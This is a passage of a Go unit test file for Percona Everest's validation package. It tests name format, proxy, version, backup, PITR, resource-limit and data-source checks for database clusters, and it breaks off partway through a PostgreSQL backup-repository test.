package validation

import (
	"context"
	"errors"
	"testing"
	"time"

	"github.com/AlekSi/pointer"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/mock"
	"github.com/stretchr/testify/require"
	"k8s.io/apimachinery/pkg/api/resource"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"

	everestv1alpha1 "github.com/percona/everest-operator/api/v1alpha1"
	everestapi "github.com/percona/everest/api"
	"github.com/percona/everest/pkg/kubernetes"
	"github.com/percona/everest/pkg/kubernetes/client"
)

func TestValidateRFC1035(t *testing.T) {
	t.Parallel()
	type testCase struct {
		value string
		valid bool
	}

	cases := []testCase{
		{
			value: "abc-sdf12",
			valid: true,
		},
		{
			value: "-abc-sdf12",
			valid: false,
		},
		{
			value: "abc-sdf12-",
			valid: false,
		},
		{
			value: "abc-sAAf12",
			valid: false,
		},
		{
			value: "abc-sAAf12",
			valid: false,
		},
		{
			value: "1abc-sf12",
			valid: false,
		},
		{
			value: "aaa123",
			valid: true,
		},
		{
			value: "asldkafaslkdjfalskdfjaslkdjflsakfjdalskfdjaslkfdjaslkfdjsaklfdassksjdfhskdjfskjdfsdfsdflasdkfasdfk",
			valid: false,
		},
		{
			value: "$%",
			valid: false,
		},
		{
			value: "asdf32$%",
			valid: false,
		},
		{
			value: "",
			valid: false,
		},
	}

	for _, tc := range cases {
		t.Run(tc.value, func(t *testing.T) {
			t.Parallel()
			require.Equal(t, tc.valid, validateRFC1035(tc.value, "") == nil)
		})
	}
}

func TestValidateMetadata(t *testing.T) {
	t.Parallel()

	testCases := []struct {
		db      *everestv1alpha1.DatabaseCluster
		wantErr error
	}{
		{
			db:      &everestv1alpha1.DatabaseCluster{},
			wantErr: errEmptyNamespace,
		},

		{
			db: &everestv1alpha1.DatabaseCluster{
				ObjectMeta: metav1.ObjectMeta{
					Namespace: "test",
				},
			},
			wantErr: errEmptyName,
		},
		{
			db: &everestv1alpha1.DatabaseCluster{
				ObjectMeta: metav1.ObjectMeta{
					Namespace: "test",
					Name:      "test",
				},
			},
			wantErr: nil,
		},
	}

	for _, tc := range testCases {
		err := validateMetadata(tc.db)
		require.Equal(t, tc.wantErr, err)
	}
}

func TestValidateCreateDatabaseClusterRequest(t *testing.T) {
	t.Parallel()
	type testCase struct {
		name  string
		value everestv1alpha1.DatabaseCluster
		err   error
	}

	cases := []testCase{
		{
			name: "empty dbCluster name",
			value: everestv1alpha1.DatabaseCluster{
				ObjectMeta: metav1.ObjectMeta{
					Name:      "",
					Namespace: "ns",
				},
			},
			err: ErrNameNotRFC1035Compatible("metadata.name"),
		},
		{
			name: "starts with -",
			value: everestv1alpha1.DatabaseCluster{
				ObjectMeta: metav1.ObjectMeta{
					Name:      "-rstrst",
					Namespace: "ns",
				},
			},
			err: ErrNameNotRFC1035Compatible("metadata.name"),
		},
		{
			name: "ends with -",
			value: everestv1alpha1.DatabaseCluster{
				ObjectMeta: metav1.ObjectMeta{
					Name:      "rstrst-",
					Namespace: "ns",
				},
			},
			err: ErrNameNotRFC1035Compatible("metadata.name"),
		},
		{
			name: "contains uppercase",
			value: everestv1alpha1.DatabaseCluster{
				ObjectMeta: metav1.ObjectMeta{
					Name:      "AAsdf",
					Namespace: "ns",
				},
			},
			err: ErrNameNotRFC1035Compatible("metadata.name"),
		},
		{
			name: "valid",
			value: everestv1alpha1.DatabaseCluster{
				ObjectMeta: metav1.ObjectMeta{
					Name:      "amsdf-sllla",
					Namespace: "ns",
				},
			},
			err: nil,
		},
		{
			name: "dbCluster name too long",
			value: everestv1alpha1.DatabaseCluster{
				ObjectMeta: metav1.ObjectMeta{
					Name:      "a123456789a123456789a123",
					Namespace: "ns",
				},
			},
			err: ErrNameTooLong("metadata.name"),
		},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			t.Parallel()
			err := validateCreateDatabaseClusterRequest(&c.value)
			if c.err == nil {
				require.NoError(t, err)
				return
			}
			assert.Equal(t, c.err.Error(), err.Error())
		})
	}
}

func TestValidateProxyType(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name       string
		engineType everestv1alpha1.EngineType
		proxyType  everestv1alpha1.ProxyType
		err        error
	}{
		{
			name:       "PXC with mongos",
			engineType: everestv1alpha1.DatabaseEnginePXC,
			proxyType:  everestv1alpha1.ProxyTypeMongos,
			err:        errUnsupportedPXCProxy,
		},
		{
			name:       "PXC with pgbouncer",
			engineType: everestv1alpha1.DatabaseEnginePXC,
			proxyType:  everestv1alpha1.ProxyTypePGBouncer,
			err:        errUnsupportedPXCProxy,
		},
		{
			name:       "PXC with haproxy",
			engineType: everestv1alpha1.DatabaseEnginePXC,
			proxyType:  everestv1alpha1.ProxyTypeHAProxy,
			err:        nil,
		},
		{
			name:       "PXC with proxysql",
			engineType: everestv1alpha1.DatabaseEnginePXC,
			proxyType:  everestv1alpha1.ProxyTypeProxySQL,
			err:        nil,
		},
		{
			name:       "psmdb with mongos",
			engineType: everestv1alpha1.DatabaseEnginePSMDB,
			proxyType:  everestv1alpha1.ProxyTypeMongos,
			err:        nil,
		},
		{
			name:       "psmdb with pgbouncer",
			engineType: everestv1alpha1.DatabaseEnginePSMDB,
			proxyType:  everestv1alpha1.ProxyTypePGBouncer,
			err:        errUnsupportedPSMDBProxy,
		},
		{
			name:       "psmdb with haproxy",
			engineType: everestv1alpha1.DatabaseEnginePSMDB,
			proxyType:  everestv1alpha1.ProxyTypeHAProxy,
			err:        errUnsupportedPSMDBProxy,
		},
		{
			name:       "psmdb with proxysql",
			engineType: everestv1alpha1.DatabaseEnginePSMDB,
			proxyType:  everestv1alpha1.ProxyTypeProxySQL,
			err:        errUnsupportedPSMDBProxy,
		},
		{
			name:       "postgresql with mongos",
			engineType: everestv1alpha1.DatabaseEnginePostgresql,
			proxyType:  everestv1alpha1.ProxyTypeMongos,
			err:        errUnsupportedPGProxy,
		},
		{
			name:       "postgresql with pgbouncer",
			engineType: everestv1alpha1.DatabaseEnginePostgresql,
			proxyType:  everestv1alpha1.ProxyTypePGBouncer,
			err:        nil,
		},
		{
			name:       "postgresql with haproxy",
			engineType: everestv1alpha1.DatabaseEnginePostgresql,
			proxyType:  everestv1alpha1.ProxyTypeHAProxy,
			err:        errUnsupportedPGProxy,
		},
		{
			name:       "postgresql with proxysql",
			engineType: everestv1alpha1.DatabaseEnginePostgresql,
			proxyType:  everestv1alpha1.ProxyTypeProxySQL,
			err:        errUnsupportedPGProxy,
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			t.Parallel()
			err := validateProxyType(c.engineType, c.proxyType)
			if c.err == nil {
				require.NoError(t, err)
				return
			}
			assert.Equal(t, c.err.Error(), err.Error())
		})
	}
}

func TestValidateProxy(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name    string
		cluster everestv1alpha1.DatabaseCluster
		err     error
	}{
		{
			name: "ok: 3 nodes 2 proxies",
			cluster: everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Engine: everestv1alpha1.Engine{
						Type:     everestv1alpha1.DatabaseEnginePXC,
						Replicas: 3,
					},
					Proxy: everestv1alpha1.Proxy{
						Type:     everestv1alpha1.ProxyTypeHAProxy,
						Replicas: pointer.ToInt32(2),
					},
				},
			},
			err: nil,
		},
		{
			name: "errMinProxyReplicas",
			cluster: everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Engine: everestv1alpha1.Engine{
						Type:     everestv1alpha1.DatabaseEnginePXC,
						Replicas: 3,
					},
					Proxy: everestv1alpha1.Proxy{
						Type:     everestv1alpha1.ProxyTypeHAProxy,
						Replicas: pointer.ToInt32(1),
					},
				},
			},
			err: errMinPXCProxyReplicas,
		},
		{
			name: "ok: 1 node 1 proxy",
			cluster: everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Engine: everestv1alpha1.Engine{
						Type:     everestv1alpha1.DatabaseEnginePXC,
						Replicas: 1,
					},
					Proxy: everestv1alpha1.Proxy{
						Type:     everestv1alpha1.ProxyTypeHAProxy,
						Replicas: pointer.ToInt32(1),
					},
				},
			},
			err: nil,
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			t.Parallel()
			err := validateProxy(&c.cluster)
			assert.Equal(t, c.err, err)
		})
	}
}

func TestContainsVersion(t *testing.T) {
	t.Parallel()
	cases := []struct {
		version  string
		versions []string
		result   bool
	}{
		{
			version:  "1",
			versions: []string{},
			result:   false,
		},
		{
			version:  "1",
			versions: []string{"1", "2"},
			result:   true,
		},
		{
			version:  "1",
			versions: []string{"1"},
			result:   true,
		},
		{
			version:  "1",
			versions: []string{"12", "23"},
			result:   false,
		},
	}
	for _, tc := range cases {
		t.Run(tc.version, func(t *testing.T) {
			t.Parallel()
			res := containsVersion(tc.version, tc.versions)
			assert.Equal(t, res, tc.result)
		})
	}
}

func TestValidateVersion(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name    string
		version string
		engine  *everestv1alpha1.DatabaseEngine
		err     error
	}{
		{
			name:    "empty version is allowed",
			version: "",
			engine:  nil,
			err:     nil,
		},
		{
			name:    "shall exist in availableVersions",
			version: "8.0.32",
			engine: &everestv1alpha1.DatabaseEngine{
				Status: everestv1alpha1.DatabaseEngineStatus{
					AvailableVersions: everestv1alpha1.Versions{
						Engine: everestv1alpha1.ComponentsMap{
							"8.0.32": &everestv1alpha1.Component{},
						},
					},
				},
			},
			err: nil,
		},
		{
			name:    "shall not exist in availableVersions",
			version: "8.0.32",
			engine: &everestv1alpha1.DatabaseEngine{
				Status: everestv1alpha1.DatabaseEngineStatus{
					AvailableVersions: everestv1alpha1.Versions{
						Engine: everestv1alpha1.ComponentsMap{
							"8.0.31": &everestv1alpha1.Component{},
						},
					},
				},
			},
			err: errors.New("8.0.32 is not in available versions list"),
		},
		{
			name:    "shall exist in allowedVersions",
			version: "8.0.32",
			engine: &everestv1alpha1.DatabaseEngine{
				Spec: everestv1alpha1.DatabaseEngineSpec{
					Type:            "pxc",
					AllowedVersions: []string{"8.0.32"},
				},
			},
			err: nil,
		},
		{
			name:    "shall not exist in allowedVersions",
			version: "8.0.32",
			engine: &everestv1alpha1.DatabaseEngine{
				Spec: everestv1alpha1.DatabaseEngineSpec{
					Type:            "pxc",
					AllowedVersions: []string{"8.0.31"},
				},
			},
			err: errors.New("using 8.0.32 version for pxc is not allowed"),
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			err := validateVersion(tc.version, tc.engine)
			if tc.err == nil {
				require.NoError(t, err)
				return
			}
			assert.Equal(t, err.Error(), tc.err.Error())
		})
	}
}

func TestValidateBackupSpec(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name    string
		cluster *everestv1alpha1.DatabaseCluster
		err     error
	}{
		{
			name:    "empty backup is allowed",
			cluster: &everestv1alpha1.DatabaseCluster{},
			err:     nil,
		},
		{
			name: "disabled backup is allowed",
			cluster: &everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Backup: everestv1alpha1.Backup{
						Enabled: false,
					},
				},
			},
			err: nil,
		},
		{
			name: "errNoSchedules",
			cluster: &everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Backup: everestv1alpha1.Backup{
						Enabled: true,
					},
				},
			},
			err: errNoSchedules,
		},
		{
			name: "errNoNameInSchedule",
			cluster: &everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Backup: everestv1alpha1.Backup{
						Enabled: true,
						Schedules: []everestv1alpha1.BackupSchedule{
							{
								Enabled: true,
							},
						},
					},
				},
			},
			err: errNoNameInSchedule,
		},
		{
			name: "errNoBackupStorageName",
			cluster: &everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Backup: everestv1alpha1.Backup{
						Enabled: true,
						Schedules: []everestv1alpha1.BackupSchedule{
							{
								Enabled: true,
								Name:    "name",
							},
						},
					},
				},
			},
			err: errScheduleNoBackupStorageName,
		},
		{
			name: "errDuplicatedSchedules",
			cluster: &everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Backup: everestv1alpha1.Backup{
						Enabled: true,
						Schedules: []everestv1alpha1.BackupSchedule{
							{
								Enabled:           true,
								Name:              "name",
								Schedule:          "0 0 * * *",
								BackupStorageName: "some",
							},
							{
								Enabled:           true,
								Name:              "other",
								Schedule:          "0 0 * * *",
								BackupStorageName: "some",
							},
						},
					},
				},
			},
			err: errDuplicatedSchedules,
		},
		{
			name: "valid spec",
			cluster: &everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Backup: everestv1alpha1.Backup{
						Enabled: true,
						Schedules: []everestv1alpha1.BackupSchedule{
							{
								Enabled:           true,
								Name:              "name",
								Schedule:          "0 0 * * *",
								BackupStorageName: "some",
							},
						},
					},
				},
			},
			err: nil,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			assert.Equal(t, tc.err, validateBackupSpec(tc.cluster))
		})
	}
}

func TestValidateBackupStoragesFor(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name      string
		namespace string
		cluster   everestv1alpha1.DatabaseCluster
		storage   everestv1alpha1.BackupStorage
		err       error
	}{
		{
			name:      "errPSMDBMultipleStorages",
			namespace: "everest",
			cluster: everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Backup: everestv1alpha1.Backup{
						Enabled: true,
						Schedules: []everestv1alpha1.BackupSchedule{
							{
								Enabled:           true,
								Name:              "name",
								BackupStorageName: "storage1",
							},
							{
								Enabled:           true,
								Name:              "name2",
								BackupStorageName: "storage2",
							},
						},
					},
					Engine: everestv1alpha1.Engine{
						Type: everestv1alpha1.DatabaseEnginePSMDB,
					},
				},
			},
			storage: everestv1alpha1.BackupStorage{
				Spec: everestv1alpha1.BackupStorageSpec{
					Type: everestv1alpha1.BackupStorageTypeS3,
				},
			},
			err: errPSMDBMultipleStorages,
		},
		{
			name:      "errPSMDBViolateActiveStorage",
			namespace: "everest",
			cluster: everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Backup: everestv1alpha1.Backup{
						Enabled: true,
						Schedules: []everestv1alpha1.BackupSchedule{
							{
								Enabled:           true,
								Name:              "name2",
								BackupStorageName: "storage2",
							},
						},
					},
					Engine: everestv1alpha1.Engine{
						Type: everestv1alpha1.DatabaseEnginePSMDB,
					},
				},
				Status: everestv1alpha1.DatabaseClusterStatus{
					ActiveStorage: "storage1",
				},
			},
			storage: everestv1alpha1.BackupStorage{
				Spec: everestv1alpha1.BackupStorageSpec{
					Type: everestv1alpha1.BackupStorageTypeS3,
				},
			},
			err: errPSMDBViolateActiveStorage,
		},
		{
			name:      "no errPSMDBViolateActiveStorage",
			namespace: "everest",
			cluster: everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Backup: everestv1alpha1.Backup{
						Enabled: true,
						Schedules: []everestv1alpha1.BackupSchedule{
							{
								Enabled:           true,
								Name:              "name2",
								BackupStorageName: "storage1",
							},
						},
					},
					Engine: everestv1alpha1.Engine{
						Type: everestv1alpha1.DatabaseEnginePSMDB,
					},
				},
				Status: everestv1alpha1.DatabaseClusterStatus{
					ActiveStorage: "",
				},
			},
			storage: everestv1alpha1.BackupStorage{
				Spec: everestv1alpha1.BackupStorageSpec{
					Type: everestv1alpha1.BackupStorageTypeS3,
				},
			},
			err: nil,
		},
		{
			name:      "errPXCPitrS3Only",
			namespace: "everest",
			cluster: everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Backup: everestv1alpha1.Backup{
						Enabled: true,
						PITR: everestv1alpha1.PITRSpec{
							Enabled:           true,
							BackupStorageName: pointer.To("storage"),
						},
						Schedules: []everestv1alpha1.BackupSchedule{
							{
								Enabled:           true,
								Name:              "otherName",
								BackupStorageName: "storage",
							},
						},
					},
					Engine: everestv1alpha1.Engine{
						Type: everestv1alpha1.DatabaseEnginePXC,
					},
				},
				Status: everestv1alpha1.DatabaseClusterStatus{
					ActiveStorage: "",
				},
			},
			storage: everestv1alpha1.BackupStorage{
				Spec: everestv1alpha1.BackupStorageSpec{
					Type: everestv1alpha1.BackupStorageTypeAzure,
				},
			},
			err: errPXCPitrS3Only,
		},
		{
			name:      "errPitrNoBackupStorageName",
			namespace: "everest",
			cluster: everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Backup: everestv1alpha1.Backup{
						Enabled: true,
						PITR: everestv1alpha1.PITRSpec{
							Enabled: true,
						},
						Schedules: []everestv1alpha1.BackupSchedule{
							{
								Enabled:           true,
								Name:              "otherName",
								BackupStorageName: "storage",
							},
						},
					},
					Engine: everestv1alpha1.Engine{
						Type: everestv1alpha1.DatabaseEnginePXC,
					},
				},
				Status: everestv1alpha1.DatabaseClusterStatus{
					ActiveStorage: "",
				},
			},
			storage: everestv1alpha1.BackupStorage{
				Spec: everestv1alpha1.BackupStorageSpec{
					Type: everestv1alpha1.BackupStorageTypeS3,
				},
			},
			err: errPitrNoBackupStorageName,
		},
		{
			name:      "valid",
			namespace: "everest",
			cluster: everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Backup: everestv1alpha1.Backup{
						Enabled: true,
						PITR: everestv1alpha1.PITRSpec{
							Enabled:           true,
							BackupStorageName: pointer.To("storage"),
						},
						Schedules: []everestv1alpha1.BackupSchedule{
							{
								Enabled:           true,
								Name:              "otherName",
								BackupStorageName: "storage",
							},
						},
					},
					Engine: everestv1alpha1.Engine{
						Type: everestv1alpha1.DatabaseEnginePXC,
					},
				},
				Status: everestv1alpha1.DatabaseClusterStatus{
					ActiveStorage: "",
				},
			},
			storage: everestv1alpha1.BackupStorage{
				Spec: everestv1alpha1.BackupStorageSpec{
					Type: everestv1alpha1.BackupStorageTypeS3,
				},
			},
			err: nil,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			k := &kubernetes.Kubernetes{}
			mockConnector := &client.MockKubeClientConnector{}
			mockConnector.On("GetBackupStorage", mock.Anything, mock.Anything, mock.Anything).
				Return(&tc.storage, nil)
			k.WithClient(mockConnector)

			h := validateHandler{
				kubeClient: k,
			}

			err := h.validateBackupStoragesFor(
				context.Background(),
				tc.namespace,
				&tc.cluster,
			)

			assert.Equal(t, tc.err, err)
		})
	}
}

func TestValidatePitrSpec(t *testing.T) {
	t.Parallel()

	cases := []struct {
		name    string
		cluster everestv1alpha1.DatabaseCluster
		err     error
	}{
		{
			name: "valid spec pitr enabled",
			cluster: everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Backup: everestv1alpha1.Backup{
						Enabled: true,
						PITR: everestv1alpha1.PITRSpec{
							Enabled:           true,
							BackupStorageName: pointer.To("name"),
						},
					},
				},
			},
			err: nil,
		},
		{
			name: "valid spec pitr disabled",
			cluster: everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Backup: everestv1alpha1.Backup{
						Enabled: true,
						PITR: everestv1alpha1.PITRSpec{
							Enabled: false,
						},
					},
				},
			},
			err: nil,
		},
		{
			name: "valid spec no pitr",
			cluster: everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Backup: everestv1alpha1.Backup{
						Enabled: true,
					},
				},
			},
			err: nil,
		},
		{
			name: "no backup storage pxc",
			cluster: everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Backup: everestv1alpha1.Backup{
						Enabled: true,
						PITR: everestv1alpha1.PITRSpec{
							Enabled: true,
						},
					},
					Engine: everestv1alpha1.Engine{
						Type: everestv1alpha1.DatabaseEnginePXC,
					},
				},
			},
			err: errPitrNoBackupStorageName,
		},
		{
			name: "no backup storage psmdb",
			cluster: everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Backup: everestv1alpha1.Backup{
						Enabled: true,
						PITR: everestv1alpha1.PITRSpec{
							Enabled: true,
						},
					},
					Engine: everestv1alpha1.Engine{
						Type: everestv1alpha1.DatabaseEnginePSMDB,
					},
				},
			},
			err: nil,
		},
		{
			name: "no backup storage pg",
			cluster: everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Backup: everestv1alpha1.Backup{
						Enabled: true,
						PITR: everestv1alpha1.PITRSpec{
							Enabled: true,
						},
					},
					Engine: everestv1alpha1.Engine{
						Type: everestv1alpha1.DatabaseEnginePostgresql,
					},
				},
			},
			err: nil,
		},
		{
			name: "zero upload interval",
			cluster: everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Backup: everestv1alpha1.Backup{
						Enabled: true,
						PITR: everestv1alpha1.PITRSpec{
							Enabled:           true,
							BackupStorageName: pointer.To("name"),
							UploadIntervalSec: pointer.ToInt(0),
						},
					},
				},
			},
			err: errPitrUploadInterval,
		},
		{
			name: "negative upload interval",
			cluster: everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Backup: everestv1alpha1.Backup{
						Enabled: true,
						PITR: everestv1alpha1.PITRSpec{
							Enabled:           true,
							BackupStorageName: pointer.To("name"),
							UploadIntervalSec: pointer.ToInt(-100),
						},
					},
				},
			},
			err: errPitrUploadInterval,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			assert.Equal(t, tc.err, validatePitrSpec(&tc.cluster))
		})
	}
}

func TestValidateResourceLimits(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name    string
		cluster everestv1alpha1.DatabaseCluster
		err     error
	}{
		{
			name: "success",
			cluster: everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Engine: everestv1alpha1.Engine{
						Resources: everestv1alpha1.Resources{
							CPU:    resource.MustParse("600m"),
							Memory: resource.MustParse("1G"),
						},
						Storage: everestv1alpha1.Storage{
							Size: resource.MustParse("2G"),
						},
					},
				},
			},
			err: nil,
		},
		{
			name: "errNoResourceDefined",
			cluster: everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Engine: everestv1alpha1.Engine{
						Storage: everestv1alpha1.Storage{
							Size: resource.MustParse("2G"),
						},
					},
				},
			},
			err: errNoResourceDefined,
		},
		{
			name: "Not enough CPU",
			cluster: everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Engine: everestv1alpha1.Engine{
						Resources: everestv1alpha1.Resources{
							Memory: resource.MustParse("1G"),
						},
						Storage: everestv1alpha1.Storage{
							Size: resource.MustParse("2G"),
						},
					},
				},
			},
			err: errNotEnoughCPU,
		},
		{
			name: "Not enough memory",
			cluster: everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Engine: everestv1alpha1.Engine{
						Resources: everestv1alpha1.Resources{
							CPU: resource.MustParse("600m"),
						},
						Storage: everestv1alpha1.Storage{
							Size: resource.MustParse("2G"),
						},
					},
				},
			},
			err: errNotEnoughMemory,
		},
		{
			name: "not enough disk size",
			cluster: everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Engine: everestv1alpha1.Engine{
						Resources: everestv1alpha1.Resources{
							CPU:    resource.MustParse("600m"),
							Memory: resource.MustParse("1G"),
						},
						Storage: everestv1alpha1.Storage{
							Size: resource.MustParse("512M"),
						},
					},
				},
			},
			err: errNotEnoughDiskSize,
		},
		{
			name: "not enough CPU",
			cluster: everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Engine: everestv1alpha1.Engine{
						Resources: everestv1alpha1.Resources{
							CPU:    resource.MustParse("200m"),
							Memory: resource.MustParse("1G"),
						},
						Storage: everestv1alpha1.Storage{
							Size: resource.MustParse("512M"),
						},
					},
				},
			},
			err: errNotEnoughCPU,
		},
		{
			name: "not enough Mem",
			cluster: everestv1alpha1.DatabaseCluster{
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Engine: everestv1alpha1.Engine{
						Resources: everestv1alpha1.Resources{
							CPU:    resource.MustParse("600m"),
							Memory: resource.MustParse("400M"),
						},
						Storage: everestv1alpha1.Storage{
							Size: resource.MustParse("512M"),
						},
					},
				},
			},
			err: errNotEnoughMemory,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			assert.Equal(t, tc.err, validateResourceLimits(&tc.cluster))
		})
	}
}

func TestValidateDataSource(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name   string
		source everestv1alpha1.DataSource
		err    error
	}{
		{
			name:   "err none of the data source specified",
			source: everestv1alpha1.DataSource{},
			err:    errDataSourceConfig,
		},
		{
			name: "err both of the data source specified",
			source: everestv1alpha1.DataSource{
				DBClusterBackupName: "some-backup",
				BackupSource: &everestv1alpha1.BackupSource{
					BackupStorageName: "some-name",
					Path:              "some-path",
				},
			},
			err: errDataSourceConfig,
		},
		{
			name: "err no date in pitr",
			source: everestv1alpha1.DataSource{
				DBClusterBackupName: "some-backup",
				PITR:                &everestv1alpha1.PITR{},
			},
			err: errDataSourceNoPitrDateSpecified,
		},
		{
			name: "wrong pitr date format",
			source: everestv1alpha1.DataSource{
				DBClusterBackupName: "some-backup",
				PITR: &everestv1alpha1.PITR{
					Date: &everestv1alpha1.RestoreDate{
						Time: metav1.Time{},
					},
				},
			},
			err: errDataSourceWrongDateFormat,
		},
		{
			name: "correct minimal",
			source: everestv1alpha1.DataSource{
				DBClusterBackupName: "some-backup",
				PITR: &everestv1alpha1.PITR{
					Date: &everestv1alpha1.RestoreDate{
						Time: metav1.Time{Time: mustParseTime(t, "2024-01-02T15:04:05Z")},
					},
				},
			},
			err: nil,
		},
		{
			name: "correct with pitr type",
			source: everestv1alpha1.DataSource{
				DBClusterBackupName: "some-backup",
				PITR: &everestv1alpha1.PITR{
					Type: everestv1alpha1.PITRTypeDate,
					Date: &everestv1alpha1.RestoreDate{
						Time: metav1.Time{Time: mustParseTime(t, "2024-01-02T15:04:05Z")},
					},
				},
			},
			err: nil,
		},
		{
			name: "unsupported pitr type",
			source: everestv1alpha1.DataSource{
				DBClusterBackupName: "some-backup",
				PITR: &everestv1alpha1.PITR{
					Type: "latest",
					Date: &everestv1alpha1.RestoreDate{
						Time: metav1.Now(),
					},
				},
			},
			err: errUnsupportedPitrType,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			assert.Equal(
				t,
				tc.err,
				validateDataSource(&tc.source),
			)
		})
	}
}

func TestValidatePGReposForAPIDB(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name           string
		cluster        everestv1alpha1.DatabaseCluster
		getBackupsFunc func(ctx context.Context, ns string, options metav1.ListOptions) (*everestv1alpha1.DatabaseClusterBackupList, error)
		err            error
	}{
		{
			name: "ok: no schedules no backups",
			cluster: everestv1alpha1.DatabaseCluster{
				ObjectMeta: metav1.ObjectMeta{
					Name:      "some",
					Namespace: "ns",
				},
			},
			getBackupsFunc: func(context.Context, string, metav1.ListOptions) (*everestv1alpha1.DatabaseClusterBackupList, error) {
				return &everestv1alpha1.DatabaseClusterBackupList{
					Items: []everestv1alpha1.DatabaseClusterBackup{},
				}, nil
			},
			err: nil,
		},
		{
			name: "ok: 2 schedules 2 backups with the same storages",
			cluster: everestv1alpha1.DatabaseCluster{
				ObjectMeta: metav1.ObjectMeta{
					Name:      "some",
					Namespace: "ns",
				},
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Backup: everestv1alpha1.Backup{
						Schedules: []everestv1alpha1.BackupSchedule{
							{BackupStorageName: "bs1"},
							{BackupStorageName: "bs2"},
						},
					},
				},
			},
			getBackupsFunc: func(context.Context, string, metav1.ListOptions) (*everestv1alpha1.DatabaseClusterBackupList, error) {
				return &everestv1alpha1.DatabaseClusterBackupList{
					Items: []everestv1alpha1.DatabaseClusterBackup{
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs1"}},
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs2"}},
					},
				}, nil
			},
			err: nil,
		},
		{
			name: "error: 3 schedules in different bs and 1 backup in another bs",
			cluster: everestv1alpha1.DatabaseCluster{
				ObjectMeta: metav1.ObjectMeta{
					Name:      "some",
					Namespace: "ns",
				},
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Backup: everestv1alpha1.Backup{
						Schedules: []everestv1alpha1.BackupSchedule{
							{BackupStorageName: "bs1"},
							{BackupStorageName: "bs2"},
							{BackupStorageName: "bs3"},
						},
					},
				},
			},
			getBackupsFunc: func(context.Context, string, metav1.ListOptions) (*everestv1alpha1.DatabaseClusterBackupList, error) {
				return &everestv1alpha1.DatabaseClusterBackupList{
					Items: []everestv1alpha1.DatabaseClusterBackup{
						{Spec: everestv1alpha1.DatabaseClusterBackupSpec{BackupStorageName: "bs4"}},
					},
				}, nil
			},
			err: errTooManyPGStorages,
		},
		{
			name: "ok: 3 schedules",
			cluster: everestv1alpha1.DatabaseCluster{
				ObjectMeta: metav1.ObjectMeta{
					Name:      "some",
					Namespace: "ns",
				},
				Spec: everestv1alpha1.DatabaseClusterSpec{
					Backup: everestv1alpha1.Backup{
						Schedules: []everestv1alpha1.BackupSchedule{
							{BackupStorageName: "bs1"},
							{BackupStorageName: "bs2"},
